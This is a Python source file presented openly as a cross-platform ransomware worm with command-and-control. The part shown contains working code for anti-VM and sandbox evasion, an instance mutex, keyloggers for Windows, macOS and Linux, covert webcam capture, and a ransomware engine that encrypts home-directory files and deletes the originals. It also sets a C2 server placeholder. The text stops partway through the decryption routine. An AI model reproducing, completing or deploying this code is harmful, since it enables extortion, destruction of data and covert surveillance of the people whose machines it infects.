#!/usr/bin/env python3
"""
Advanced Cross-Platform Ransomware Worm with Full C2 Capabilities
Complete integration of ransomware, keylogging, webcam, remote control, and more
Works on Windows, macOS, and Linux
Enhanced with Anti-VM, Persistence, Fileless Execution, Process Injection, etc.
"""

import os
import sys
import json
import time
import socket
import base64
import hashlib
import platform
import subprocess
import threading
import sqlite3
import secrets
import logging
import shutil
import getpass
import random
import string
from pathlib import Path
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
import queue
import signal
import uuid
import re
import tempfile
import struct
import zlib
import glob
import requests
from typing import List, Dict, Any, Optional

# ============================================================
# DEBUGGING AND LOGGING
# ============================================================

DEBUG_MODE = True
LOG_FILE = 'worm_debug.log'

def debug_log(message, level="INFO"):
    """Debug logging function"""
    if DEBUG_MODE:
        timestamp = datetime.now().isoformat()
        log_entry = f"[{timestamp}] [{level}] {message}"
        print(log_entry)
        try:
            with open(LOG_FILE, 'a') as f:
                f.write(log_entry + '\n')
        except:
            pass

# ============================================================
# OS DETECTION AND COMPATIBILITY
# ============================================================

class OSDetector:
    """Detect OS and provide OS-specific utilities"""
    
    @staticmethod
    def get_os():
        system = platform.system()
        if system == 'Windows':
            return 'windows'
        elif system == 'Darwin':
            return 'macos'
        else:
            return 'linux'
    
    @staticmethod
    def is_windows():
        return OSDetector.get_os() == 'windows'
    
    @staticmethod
    def is_macos():
        return OSDetector.get_os() == 'macos'
    
    @staticmethod
    def is_linux():
        return OSDetector.get_os() == 'linux'
    
    @staticmethod
    def get_os_version():
        return platform.platform()
    
    @staticmethod
    def get_architecture():
        return platform.machine()

# ============================================================
# CONFIGURATION
# ============================================================

CONFIG_DIR = os.path.expanduser('~/.system_update')
CONFIG_FILE = os.path.join(CONFIG_DIR, 'config.json')
DB_FILE = os.path.join(CONFIG_DIR, 'worm_c2.db')
C2_SERVER = os.environ.get('C2_SERVER', 'your-c2-domain.com')
C2_PUBLIC_KEY = os.environ.get('C2_PUBLIC_KEY', '')
MAX_WORKERS = 20
CHECKPOINT_FILE = os.path.join(CONFIG_DIR, 'checkpoint.json')
LOCK_FILE = '/tmp/worm.lock' if OSDetector.is_linux() else os.path.join(tempfile.gettempdir(), 'worm.lock')

# ============================================================
# STEALTH DATABASE
# ============================================================

class StealthDatabase:
    """Encrypted SQLite database for tracking"""
    
    def __init__(self, db_path=DB_FILE):
        debug_log(f"Initializing database at {db_path}")
        self.db_path = db_path
        self.data = {
            'infections': [],
            'encrypted_files': [],
            'collected_data': [],
            'keylog_data': [],
            'webcam_frames': [],
            'commands': [],
            'exfiltrated_data': []
        }
        os.makedirs(os.path.dirname(db_path), exist_ok=True)
    
    def add_infection(self, host_id, data):
        self.data['infections'].append({
            'host_id': host_id,
            'data': data,
            'timestamp': datetime.now().isoformat()
        })
    
    def add_encrypted_file(self, host_id, file_path, data):
        self.data['encrypted_files'].append({
            'host_id': host_id,
            'file_path': file_path,
            'data': data,
            'timestamp': datetime.now().isoformat()
        })
    
    def add_collected_data(self, host_id, data_type, data):
        self.data['collected_data'].append({
            'host_id': host_id,
            'data_type': data_type,
            'data': data,
            'timestamp': datetime.now().isoformat()
        })
    
    def add_keylog_entry(self, entry):
        self.data['keylog_data'].append(entry)
    
    def add_webcam_frame(self, frame_data):
        self.data['webcam_frames'].append(frame_data)
    
    def add_exfiltrated_data(self, file_path, data):
        self.data['exfiltrated_data'].append({
            'file_path': file_path,
            'data': data[:100] + '...' if len(data) > 100 else data,
            'timestamp': datetime.now().isoformat()
        })
    
    def get_stats(self):
        return {
            'infections': len(self.data['infections']),
            'encrypted_files': len(self.data['encrypted_files']),
            'collected_data': len(self.data['collected_data']),
            'keylog_entries': len(self.data['keylog_data']),
            'webcam_frames': len(self.data['webcam_frames']),
            'exfiltrated_data': len(self.data['exfiltrated_data'])
        }

# ============================================================
# ANTI-VM/ANTI-SANDBOX DETECTION
# ============================================================

class AntiVMDetector:
    """Detect virtual machines and sandboxes"""
    
    @staticmethod
    def check_environment():
        """Check if running in VM/sandbox"""
        debug_log("Checking environment for VM/sandbox")
        
        # Check for VM artifacts
        vm_checks = [
            os.path.exists("/proc/vz"),
            os.path.exists("/proc/xen"),
            os.path.exists("/.dockerenv"),
            os.path.exists("/.dockerinit"),
            os.path.exists("/dev/.udev"),
            os.path.exists("/sys/devices/virtual/dmi/id/product_name"),
            os.path.exists("/sys/devices/virtual/dmi/id/sys_vendor")
        ]
        
        # Check for VM vendor strings
        try:
            if os.path.exists("/sys/devices/virtual/dmi/id/product_name"):
                with open("/sys/devices/virtual/dmi/id/product_name", "r") as f:
                    if any(vm in f.read().lower() for vm in ['vmware', 'virtualbox', 'kvm', 'xen']):
                        vm_checks.append(True)
        except:
            pass
        
        # Windows-specific VM checks
        if OSDetector.is_windows():
            try:
                import wmi
                c = wmi.WMI()
                for item in c.Win32_ComputerSystem():
                    if any(vm in item.Model.lower() for vm in ['vmware', 'virtualbox', 'xen']):
                        vm_checks.append(True)
                    if any(vm in item.Manufacturer.lower() for vm in ['vmware', 'virtualbox']):
                        vm_checks.append(True)
            except:
                pass
            
            # Check for common sandbox processes
            sandbox_processes = ['vmtoolsd', 'vboxservice', 'xenservice']
            try:
                import psutil
                for proc in psutil.process_iter(['name']):
                    if proc.info['name'] and any(sp in proc.info['name'].lower() for sp in sandbox_processes):
                        vm_checks.append(True)
                        break
            except:
                pass
        
        # Check environment variables
        env_checks = [
            os.getenv("COMPUTERNAME", "").startswith("SANDBOX"),
            os.getenv("USERNAME", "").startswith("SANDBOX"),
            os.getenv("VIRTUAL_ENV", "").lower() in ['sandbox', 'vm']
        ]
        
        # Check for debuggers
        debug_checks = [
            sys.gettrace() is not None,
            os.getenv("PYCHARM_HOSTED") is not None
        ]
        
        # Check uptime (VMs often have short uptime)
        try:
            if OSDetector.is_linux():
                with open("/proc/uptime", "r") as f:
                    uptime = float(f.read().split()[0])
                    if uptime < 300:  # Less than 5 minutes
                        vm_checks.append(True)
            elif OSDetector.is_windows():
                import ctypes
                uptime = ctypes.windll.kernel32.GetTickCount64() / 1000
                if uptime < 300:
                    vm_checks.append(True)
        except:
            pass
        
        # Check RAM (VMs often have less RAM)
        try:
            import psutil
            total_memory = psutil.virtual_memory().total / (1024 ** 3)  # GB
            if total_memory < 2:  # Less than 2GB
                vm_checks.append(True)
        except:
            pass
        
        # Check CPU cores (VMs often have fewer)
        try:
            import multiprocessing
            if multiprocessing.cpu_count() < 2:
                vm_checks.append(True)
        except:
            pass
        
        if any(vm_checks) or any(env_checks) or any(debug_checks):
            debug_log("⚠️ VM/Sandbox detected! Exiting quietly.")
            return True
        return False
    
    @staticmethod
    def stealth_delay():
        """Add random delays to avoid detection"""
        if AntiVMDetector.check_environment():
            time.sleep(random.randint(30, 120))  # Wait if in VM
        else:
            time.sleep(random.randint(1, 5))

# ============================================================
# SINGLE INSTANCE MUTEX
# ============================================================

class SingleInstance:
    """Ensure only one instance runs"""
    
    @staticmethod
    def acquire_lock():
        """Acquire lock to prevent multiple instances"""
        try:
            if OSDetector.is_windows():
                import win32event, win32api, winerror
                mutex = win32event.CreateMutex(None, False, "Global\\WormInstance")
                if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
                    debug_log("⚠️ Another instance is already running")
                    sys.exit(0)
                return True
            else:
                # Linux/Unix
                import fcntl
                lock_file = open(LOCK_FILE, 'w')
                fcntl.flock(lock_file, fcntl.LOCK_EX | fcntl.LOCK_NB)
                return lock_file
        except Exception as e:
            debug_log(f"Lock acquisition failed: {e}")
            sys.exit(0)

# ============================================================
# CROSS-PLATFORM KEYLOGGER
# ============================================================

class CrossPlatformKeylogger:
    """Keylogger that works on Windows, macOS, and Linux"""
    
    def __init__(self, db=None):
        debug_log("Initializing CrossPlatformKeylogger")
        self.db = db or StealthDatabase()
        self.os_type = platform.system()
        self.is_active = False
        self.log_data = []
        self.listener = None
        self._setup_keylogger()
    
    def _setup_keylogger(self):
        debug_log(f"Setting up keylogger for {self.os_type}")
        
        if self.os_type == 'Windows':
            self._setup_windows_keylogger()
        elif self.os_type == 'Darwin':
            self._setup_macos_keylogger()
        else:
            self._setup_linux_keylogger()
    
    def _setup_windows_keylogger(self):
        try:
            import ctypes
            from ctypes import wintypes
            
            WH_KEYBOARD_LL = 13
            WM_KEYDOWN = 0x0100
            WM_SYSKEYDOWN = 0x0104
            
            HOOKPROC = ctypes.WINFUNCTYPE(wintypes.LPARAM, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)
            
            user32 = ctypes.WinDLL('user32', use_last_error=True)
            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            
            def low_level_keyboard_handler(nCode, wParam, lParam):
                if nCode >= 0:
                    if wParam in (WM_KEYDOWN, WM_SYSKEYDOWN):
                        key_code = lParam & 0xFFFF
                        key_name = self._get_windows_key_name(key_code, wParam)
                        
                        if key_name:
                            entry = {
                                'key': key_name,
                                'timestamp': datetime.now().isoformat(),
                                'type': 'keydown'
                            }
                            self.log_data.append(entry)
                            self.db.add_keylog_entry(entry)
                            
                            if key_name == 'Return':
                                entry = {
                                    'key': '[ENTER]',
                                    'timestamp': datetime.now().isoformat(),
                                    'type': 'special'
                                }
                                self.log_data.append(entry)
                                self.db.add_keylog_entry(entry)
                
                return user32.CallNextHookEx(None, nCode, wParam, lParam)
            
            hook_proc = HOOKPROC(low_level_keyboard_handler)
            hook = user32.SetWindowsHookExW(
                WH_KEYBOARD_LL,
                hook_proc,
                kernel32.GetModuleHandleW(None),
                0
            )
            
            if hook:
                self.listener = {
                    'hook': hook,
                    'hook_proc': hook_proc,
                    'user32': user32,
                    'running': True
                }
                
                def message_loop():
                    msg = wintypes.MSG()
                    while self.listener and self.listener.get('running', False):
                        if user32.GetMessageW(ctypes.byref(msg), None, 0, 0) > 0:
                            user32.TranslateMessage(ctypes.byref(msg))
                            user32.DispatchMessageW(ctypes.byref(msg))
                
                threading.Thread(target=message_loop, daemon=True).start()
                debug_log("✅ Windows keylogger initialized")
            else:
                debug_log("⚠️ Windows hook failed, falling back to pynput")
                self._setup_pynput_keylogger()
                
        except Exception as e:
            debug_log(f"⚠️ Windows keylogger error: {e}", "ERROR")
            self._setup_pynput_keylogger()
    
    def _get_windows_key_name(self, key_code, wParam):
        vk_codes = {
            0x08: 'BackSpace', 0x09: 'Tab', 0x0D: 'Return',
            0x10: 'Shift', 0x11: 'Control', 0x12: 'Alt',
            0x14: 'CapsLock', 0x1B: 'Escape', 0x20: 'Space',
            0x21: 'PageUp', 0x22: 'PageDown', 0x23: 'End',
            0x24: 'Home', 0x25: 'Left', 0x26: 'Up',
            0x27: 'Right', 0x28: 'Down', 0x2D: 'Insert',
            0x2E: 'Delete', 0x70: 'F1', 0x71: 'F2',
            0x72: 'F3', 0x73: 'F4', 0x74: 'F5', 0x75: 'F6',
            0x76: 'F7', 0x77: 'F8', 0x78: 'F9', 0x79: 'F10',
            0x7A: 'F11', 0x7B: 'F12', 0x90: 'NumLock',
            0x91: 'ScrollLock', 0xA0: 'LShift', 0xA1: 'RShift',
            0xA2: 'LControl', 0xA3: 'RControl', 0xA4: 'LAlt',
            0xA5: 'RAlt',
        }
        
        if 0x30 <= key_code <= 0x5A:
            shift_pressed = (ctypes.windll.user32.GetAsyncKeyState(0x10) & 0x8000) != 0
            if shift_pressed:
                if 0x41 <= key_code <= 0x5A:
                    return chr(key_code)
                elif 0x30 <= key_code <= 0x39:
                    shift_chars = ')!@#$%^&*('
                    return shift_chars[key_code - 0x30]
            else:
                if 0x41 <= key_code <= 0x5A:
                    return chr(key_code + 32)
                elif 0x30 <= key_code <= 0x39:
                    return chr(key_code)
        
        return vk_codes.get(key_code, None)
    
    def _setup_macos_keylogger(self):
        try:
            import Quartz
            import AppKit
            
            debug_log("Setting up macOS keylogger")
            
            def event_tap_callback(proxy, type_, event, refcon):
                if type_ in [Quartz.kCGEventKeyDown, Quartz.kCGEventKeyUp]:
                    if type_ == Quartz.kCGEventKeyDown:
                        key_code = Quartz.CGEventGetIntegerValueField(
                            event, Quartz.kCGKeyboardEventKeycode
                        )
                        
                        special_keys = {
                            0x24: '[ENTER]', 0x30: '[TAB]', 0x31: '[SPACE]',
                            0x33: '[BACKSPACE]', 0x35: '[ESC]', 0x7A: '[F1]',
                            0x78: '[F2]', 0x63: '[F3]', 0x76: '[F4]',
                            0x60: '[F5]', 0x61: '[F6]', 0x62: '[F7]',
                            0x64: '[F8]', 0x65: '[F9]', 0x6D: '[F10]',
                            0x67: '[F11]', 0x6F: '[F12]', 0x73: '[HOME]',
                            0x77: '[END]', 0x79: '[PGUP]', 0x7C: '[PGDN]',
                            0x7B: '[LEFT]', 0x7E: '[UP]', 0x7D: '[RIGHT]',
                            0x7F: '[DOWN]', 0x72: '[DEL]'
                        }
                        
                        if key_code in special_keys:
                            key_name = special_keys[key_code]
                        else:
                            keyboard_event = Quartz.CGEventCreateKeyboardEvent(None, key_code, True)
                            chars = Quartz.CGEventKeyboardGetUnicodeString(keyboard_event)
                            key_name = chars if chars else f'[KEY:{key_code}]'
                        
                        entry = {
                            'key': key_name,
                            'timestamp': datetime.now().isoformat(),
                            'type': 'keydown'
                        }
                        self.log_data.append(entry)
                        self.db.add_keylog_entry(entry)
                
                return event
            
            event_mask = (Quartz.CGEventMaskBit(Quartz.kCGEventKeyDown) |
                          Quartz.CGEventMaskBit(Quartz.kCGEventKeyUp))
            
            event_tap = Quartz.CGEventTapCreate(
                Quartz.kCGSessionEventTap,
                Quartz.kCGHeadInsertEventTap,
                Quartz.kCGEventTapOptionDefault,
                event_mask,
                event_tap_callback,
                None
            )
            
            if event_tap:
                run_loop_source = Quartz.CFMachPortCreateRunLoopSource(None, event_tap, 0)
                Quartz.CFRunLoopAddSource(
                    Quartz.CFRunLoopGetCurrent(),
                    run_loop_source,
                    Quartz.kCFRunLoopDefaultMode
                )
                
                self.listener = {
                    'event_tap': event_tap,
                    'run_loop_source': run_loop_source,
                    'running': True
                }
                
                def run_loop():
                    while self.listener and self.listener.get('running', False):
                        Quartz.CFRunLoopRunInMode(Quartz.kCFRunLoopDefaultMode, 0.1, False)
                        time.sleep(0.01)
                
                threading.Thread(target=run_loop, daemon=True).start()
                debug_log("✅ macOS keylogger initialized")
            else:
                debug_log("⚠️ macOS event tap failed, falling back to pynput")
                self._setup_pynput_keylogger()
                
        except Exception as e:
            debug_log(f"⚠️ macOS keylogger error: {e}", "ERROR")
            self._setup_pynput_keylogger()
    
    def _setup_linux_keylogger(self):
        try:
            try:
                import evdev
                from evdev import InputDevice, categorize, ecodes
                
                debug_log("Setting up Linux keylogger with evdev")
                
                devices = [evdev.InputDevice(path) for path in evdev.list_devices()]
                keyboards = []
                
                for device in devices:
                    try:
                        if 'keyboard' in device.name.lower() or 'kbd' in device.name.lower():
                            keyboards.append(device)
                    except:
                        continue
                
                if keyboards:
                    keyboard = keyboards[0]
                    debug_log(f"Using keyboard device: {keyboard.name}")
                    
                    def event_loop():
                        for event in keyboard.read_loop():
                            if event.type == ecodes.EV_KEY:
                                key_event = categorize(event)
                                if key_event.keystate == key_event.key_down:
                                    key_name = key_event.keycode
                                    if key_name:
                                        entry = {
                                            'key': key_name,
                                            'timestamp': datetime.now().isoformat(),
                                            'type': 'keydown'
                                        }
                                        self.log_data.append(entry)
                                        self.db.add_keylog_entry(entry)
                    
                    threading.Thread(target=event_loop, daemon=True).start()
                    self.listener = {'running': True}
                    debug_log("✅ Linux keylogger initialized (evdev)")
                    return
                    
            except ImportError:
                debug_log("ℹ️ evdev not available, trying pynput...")
            
            self._setup_pynput_keylogger()
            
        except Exception as e:
            debug_log(f"⚠️ Linux keylogger error: {e}", "ERROR")
            self._setup_pynput_keylogger()
    
    def _setup_pynput_keylogger(self):
        try:
            from pynput import keyboard
            
            debug_log("Setting up pynput keylogger")
            
            def on_press(key):
                try:
                    if hasattr(key, 'char') and key.char:
                        key_name = key.char
                    else:
                        key_name = str(key).replace('Key.', '')
                        special_map = {
                            'enter': '[ENTER]', 'space': '[SPACE]',
                            'backspace': '[BACKSPACE]', 'tab': '[TAB]',
                            'esc': '[ESC]', 'shift': '[SHIFT]',
                            'ctrl': '[CTRL]', 'alt': '[ALT]',
                            'up': '[UP]', 'down': '[DOWN]',
                            'left': '[LEFT]', 'right': '[RIGHT]',
                            'f1': '[F1]', 'f2': '[F2]', 'f3': '[F3]',
                            'f4': '[F4]', 'f5': '[F5]', 'f6': '[F6]',
                            'f7': '[F7]', 'f8': '[F8]', 'f9': '[F9]',
                            'f10': '[F10]', 'f11': '[F11]', 'f12': '[F12]',
                        }
                        key_name = special_map.get(key_name.lower(), f'[{key_name}]')
                    
                    entry = {
                        'key': key_name,
                        'timestamp': datetime.now().isoformat(),
                        'type': 'keydown'
                    }
                    self.log_data.append(entry)
                    self.db.add_keylog_entry(entry)
                    
                except Exception as e:
                    entry = {
                        'key': f'[ERROR:{str(e)}]',
                        'timestamp': datetime.now().isoformat(),
                        'type': 'error'
                    }
                    self.log_data.append(entry)
                    self.db.add_keylog_entry(entry)
            
            listener = keyboard.Listener(on_press=on_press)
            listener.start()
            
            self.listener = {
                'listener': listener,
                'running': True
            }
            
            debug_log("✅ Keylogger initialized (pynput)")
            
        except ImportError:
            debug_log("❌ pynput not available", "ERROR")
            self.listener = None
    
    def start(self):
        debug_log("Starting keylogger")
        if not self.listener:
            self._setup_keylogger()
        
        if self.listener:
            self.is_active = True
            return True
        return False
    
    def stop(self):
        debug_log("Stopping keylogger")
        self.is_active = False
        if self.listener:
            self.listener['running'] = False
        
        if platform.system() == 'Windows' and self.listener and 'hook' in self.listener:
            try:
                import ctypes
                user32 = ctypes.WinDLL('user32', use_last_error=True)
                user32.UnhookWindowsHookEx(self.listener['hook'])
            except:
                pass
        
        return True
    
    def get_logs(self, limit=None):
        if limit:
            return self.log_data[-limit:]
        return self.log_data
    
    def get_stats(self):
        return {
            'total_keys': len(self.log_data),
            'is_active': self.is_active,
            'os_type': platform.system()
        }

# ============================================================
# CROSS-PLATFORM WEBCAM
# ============================================================

class CrossPlatformWebcam:
    """Webcam module that works on Windows, macOS, and Linux"""
    
    def __init__(self, db=None):
        debug_log("Initializing CrossPlatformWebcam")
        self.db = db or StealthDatabase()
        self.os_type = platform.system()
        self.is_active = False
        self.capture = None
        self._setup_webcam()
    
    def _setup_webcam(self):
        debug_log(f"Setting up webcam for {self.os_type}")
        
        try:
            import cv2
            debug_log("Trying OpenCV webcam")
            self.capture = cv2.VideoCapture(0)
            if self.capture.isOpened():
                debug_log("✅ Webcam initialized (OpenCV)")
                return
        except:
            pass
        
        if self.os_type == 'Windows':
            self._setup_windows_webcam()
        elif self.os_type == 'Darwin':
            self._setup_macos_webcam()
        else:
            self._setup_linux_webcam()
    
    def _setup_windows_webcam(self):
        try:
            import cv2
            for backend in [cv2.CAP_DSHOW, cv2.CAP_MSMF, cv2.CAP_ANY]:
                try:
                    cap = cv2.VideoCapture(0, backend)
                    if cap.isOpened():
                        self.capture = cap
                        debug_log("✅ Windows webcam initialized")
                        return
                except:
                    continue
        except:
            pass
    
    def _setup_macos_webcam(self):
        try:
            import cv2
            for backend in [cv2.CAP_AVFOUNDATION, cv2.CAP_ANY]:
                try:
                    cap = cv2.VideoCapture(0, backend)
                    if cap.isOpened():
                        self.capture = cap
                        debug_log("✅ macOS webcam initialized")
                        return
                except:
                    continue
        except:
            pass
    
    def _setup_linux_webcam(self):
        try:
            import cv2
            cap = cv2.VideoCapture(0, cv2.CAP_V4L2)
            if cap.isOpened():
                self.capture = cap
                debug_log("✅ Linux webcam initialized")
                return
        except:
            pass
    
    def capture_frame(self):
        if not self.capture:
            return None
        
        try:
            import cv2
            
            if hasattr(self.capture, 'read'):
                ret, frame = self.capture.read()
                if ret:
                    _, buffer = cv2.imencode('.jpg', frame)
                    encoded = base64.b64encode(buffer).decode('utf-8')
                    self.db.add_webcam_frame({
                        'frame': encoded[:100] + '...',
                        'timestamp': datetime.now().isoformat()
                    })
                    return encoded
        except Exception as e:
            debug_log(f"Webcam capture error: {e}", "ERROR")
        
        return None
    
    def stream_frames(self, duration=None, frame_rate=5):
        frames = []
        start_time = time.time()
        
        while True:
            if duration and (time.time() - start_time) > duration:
                break
            
            frame = self.capture_frame()
            if frame:
                frames.append({
                    'frame': frame,
                    'timestamp': datetime.now().isoformat()
                })
            
            time.sleep(1.0 / frame_rate)
            
            if len(frames) >= 100:
                break
        
        return frames
    
    def release(self):
        if self.capture:
            try:
                import cv2
                if hasattr(self.capture, 'release'):
                    self.capture.release()
            except:
                pass
        self.capture = None

# ============================================================
# ENHANCED RANSOMWARE ENGINE
# ============================================================

class RansomwareEngine:
    """Enhanced ransomware encryption engine with all features"""
    
    def __init__(self, db=None):
        debug_log("Initializing RansomwareEngine")
        self.db = db or StealthDatabase()
        self.host_id = str(uuid.uuid4())
        # Random extension per infection
        extensions = ['.encrypted', '.locked', '.crypt', '.ransom', '.crypto']
        self.encrypted_ext = random.choice(extensions) + ''.join(random.choices(string.ascii_lowercase, k=3))
        self.files_encrypted = False
        self.encrypted_file_list = []
        self._key = None
        self._salt = None
        self.processed_count = 0
        self.last_file = None
        self.parallel_encryption = True
        self.checkpoint_data = {}
    
    def _generate_key(self, password):
        """Generate encryption key from password"""
        try:
            from cryptography.fernet import Fernet
            from cryptography.hazmat.primitives import hashes
            from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
            from cryptography.hazmat.backends import default_backend
            
            self._salt = os.urandom(32)
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=self._salt,
                iterations=600000,
                backend=default_backend()
            )
            key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
            self._key = key
            return key
        except ImportError:
            debug_log("Cryptography not installed", "ERROR")
            return None
    
    def _encrypt_single_file(self, file_path, fernet):
        """Encrypt a single file with error handling"""
        try:
            if file_path.endswith(self.encrypted_ext):
                return False
            
            file_size = os.path.getsize(file_path)
            if file_size < 10 or file_size > 1024 * 1024 * 100:
                return False
            
            with open(file_path, 'rb') as f:
                data = f.read()
            
            salt_len = len(self._salt).to_bytes(4, 'big')
            encrypted_data = fernet.encrypt(data)
            combined = salt_len + self._salt + encrypted_data
            
            encrypted_path = file_path + self.encrypted_ext
            with open(encrypted_path, 'wb') as f:
                f.write(combined)
            
            os.remove(file_path)
            
            self.db.add_encrypted_file(
                self.host_id,
                file_path,
                {'size': len(data)}
            )
            self.encrypted_file_list.append(file_path)
            self.processed_count += 1
            self.last_file = file_path
            
            # Save checkpoint periodically
            if self.processed_count % 50 == 0:
                self.save_checkpoint()
            
            return True
            
        except Exception as e:
            debug_log(f"Failed to encrypt {file_path}: {e}", "ERROR")
            return False
    
    def _decrypt_single_file(self, file_path, fernet):
        """Decrypt a single file"""
        try:
            if not file_path.endswith(self.encrypted_ext):
                return False
            
            with open(file_path, 'rb') as f:
                data = f.read()
            
            salt_len = int.from_bytes(data[:4], 'big')
            salt = data[4:4+salt_len]
            encrypted_data = data[4+salt_len:]
            
            from cryptography.hazmat.primitives import hashes
            from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
            from cryptography.hazmat.backends import default_backend
            
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=600000,
                backend=default_backend()
            )
            
            decrypted_data = fernet.decrypt(encrypted_data)
            original_path = file_path[:-len(self.encrypted_ext)]
            
            with open(original_path, 'wb') as f:
                f.write(decrypted_data)
            
            os.remove(file_path)
            if original_path in self.encrypted_file_list:
                self.encrypted_file_list.remove(original_path)
            return True
            
        except Exception as e:
            debug_log(f"Failed to decrypt {file_path}: {e}", "ERROR")
            return False
    
    def save_checkpoint(self):
        """Save encryption checkpoint"""
        try:
            checkpoint_data = {
                'processed_count': self.processed_count,
                'last_file': self.last_file,
                'encrypted_files': self.encrypted_file_list[-100:],  # Last 100 for quick resume
                'timestamp': datetime.now().isoformat()
            }
            with open(CHECKPOINT_FILE, 'w') as f:
                json.dump(checkpoint_data, f)
            debug_log(f"Checkpoint saved at {self.processed_count} files")
        except Exception as e:
            debug_log(f"Checkpoint save failed: {e}", "ERROR")
    
    def load_checkpoint(self):
        """Load encryption checkpoint"""
        try:
            if os.path.exists(CHECKPOINT_FILE):
                with open(CHECKPOINT_FILE, 'r') as f:
                    self.checkpoint_data = json.load(f)
                    self.processed_count = self.checkpoint_data.get('processed_count', 0)
                    debug_log(f"Checkpoint loaded: {self.processed_count} files processed")
                    return True
        except Exception as e:
            debug_log(f"Checkpoint load failed: {e}", "ERROR")
        return False
    
    def encrypt_files(self, password=None, file_paths=None, directory=None, recursive=True):
        """Enhanced encryption with parallel processing and checkpointing"""
        debug_log("Starting encryption with options")
        print("🔒 ENCRYPTING FILES...")
        
        if not password:
            password = getpass.getpass("Enter encryption password: ")
        
        key = self._generate_key(password)
        if not key:
            return False
        
        try:
            from cryptography.fernet import Fernet
            fernet = Fernet(key)
        except ImportError:
            debug_log("Cryptography not installed", "ERROR")
            print("❌ Cryptography module not installed")
            return False
        
        files_to_encrypt = []
        
        # Load checkpoint to resume if interrupted
        self.load_checkpoint()
        
        # Collect files based on mode
        if file_paths:
            for file_path in file_paths:
                if os.path.isfile(file_path):
                    if file_path not in self.encrypted_file_list:
                        files_to_encrypt.append(file_path)
                elif os.path.isdir(file_path):
                    for root, dirs, files in os.walk(file_path):
                        for file in files:
                            full_path = os.path.join(root, file)
                            if full_path not in self.encrypted_file_list:
                                files_to_encrypt.append(full_path)
        
        elif directory:
            if os.path.isdir(directory):
                if recursive:
                    for root, dirs, files in os.walk(directory):
                        if any(x in root for x in ['System', 'Windows', 'Program Files', 'Library', '.git', '__pycache__']):
                            continue
                        for file in files:
                            file_path = os.path.join(root, file)
                            try:
                                if os.path.getsize(file_path) > 10 and file_path not in self.encrypted_file_list:
                                    files_to_encrypt.append(file_path)
                            except:
                                continue
                else:
                    for item in os.listdir(directory):
                        item_path = os.path.join(directory, item)
                        if os.path.isfile(item_path):
                            try:
                                if os.path.getsize(item_path) > 10 and item_path not in self.encrypted_file_list:
                                    files_to_encrypt.append(item_path)
                            except:
                                continue
            else:
                print(f"❌ Directory not found: {directory}")
                return False
        
        else:
            # Encrypt everything
            debug_log("Encrypting all files")
            home = os.path.expanduser('~')
            for root, dirs, files in os.walk(home):
                if any(x in root for x in ['System', 'Windows', 'Program Files', 'Library', '.git', '__pycache__']):
                    continue
                for file in files:
                    file_path = os.path.join(root, file)
                    try:
                        if os.path.getsize(file_path) > 10 and not file_path.endswith(self.encrypted_ext):
                            if file_path not in self.encrypted_file_list:
                                files_to_encrypt.append(file_path)
                    except:
                        continue
        
        # Limit for safety
        if len(files_to_encrypt) > 10000:
            files_to_encrypt = files_to_encrypt[:10000]
        
        debug_log(f"Found {len(files_to_encrypt)} files to encrypt")
        print(f"📁 Found {len(files_to_encrypt)} files to encrypt")
        
        encrypted_count = 0
        
        if self.parallel_encryption:
            # Parallel encryption
            with ThreadPoolExecutor(max_workers=os.cpu_count() * 2) as executor:
                futures = {executor.submit(self._encrypt_single_file, f, fernet): f for f in files_to_encrypt}
                
                for future in as_completed(futures):
                    if future.result():
                        encrypted_count += 1
                        if encrypted_count % 10 == 0:
                            print(f"🔒 Encrypted {encrypted_count} files...")
        else:
            # Sequential encryption
            for file_path in files_to_encrypt:
                if self._encrypt_single_file(file_path, fernet):
                    encrypted_count += 1
                    if encrypted_count % 10 == 0:
                        print(f"🔒 Encrypted {encrypted_count} files...")
        
        self.files_encrypted = True
        print(f"\n✅ Encrypted {encrypted_count} files!")
        return True
    
    def decrypt_files(self, password=None, file_paths=None, directory=None, recursive=True):
        """Enhanced decryption with parallel processing"""
        debug_log("Starting decryption with options")
        print("🔓 DECRYPTING FILES...")
        
        if not password:
            password = getpass.getpass("Enter decryption password: ")
        
        try:
            from cryptography.fernet import Fernet
            from cryptography.hazmat.primitives import hashes
            from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
            from cryptography.hazmat.backends import default_backend
        except ImportError:
            debug_log("Cryptography not installed", "ERROR")
            print("❌ Cryptography module not installed")
            return False
        
        encrypted_files = []
        
        if file_paths:
            for file_path in file_paths:
                if os.path.isfile(file_path) and file_path.endswith(self.encrypted_ext):
                    encrypted_files.append(file_path)
                elif os.path.isdir(file_path):
                    for root, dirs, files in os.walk(file_path):
                        for file in files:
                            if file.endswith(self.encrypted_ext):
                                encrypted_files.append(os.path.join(root, file))
        
        elif directory:
            if os.path.isdir(directory):
                if recursive:
                    for root, dirs, files in os.walk(directory):
                        for file in files:
                            if file.endswith(self.encrypted_ext):
                                encrypted_files.append(os.path.join(root, file))
                else:
                    for item in os.listdir(directory):
                        item_path = os.path.join(directory, item)
                        if os.path.isfile(item_path) and item_path.endswith(self.encrypted_ext):
                            encrypted_files.append(item_path)
            else:
                print(f"❌ Directory not found: {directory}")
                return False
        
        else:
            debug_log("Decrypting all files")
            home = os.path.expanduser('~')
            for root, dirs, files in os.walk(home):
                for file in files:
                    if file.endswith(self.encrypted_ext):
                        encrypted_files.append(os.path.join(root, file))
        
        if not encrypted_files:
            print("No encrypted files found!")
            return False
        
        debug_log(f"Found {len(encrypted_files)} encrypted files")
        print(f"📁 Found {len(encrypted_files)} encrypted files")
        
        decrypted_count = 0
        for file_path in encrypted_files:
            try:
                with open(file_path, 'rb') as f:
                    data = f.read()
                
                salt_len = int.from_bytes(data[:4], 'big')
                salt = data[4:4+salt_len]
                
                kdf = PBKDF2HMAC(
                    algorithm=hashes.SHA256(),
                    length=32,
                    salt=salt,
                    iterations=600000,
                    backend=default_backend()
                )
                key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
                fernet = Fernet(key)
                
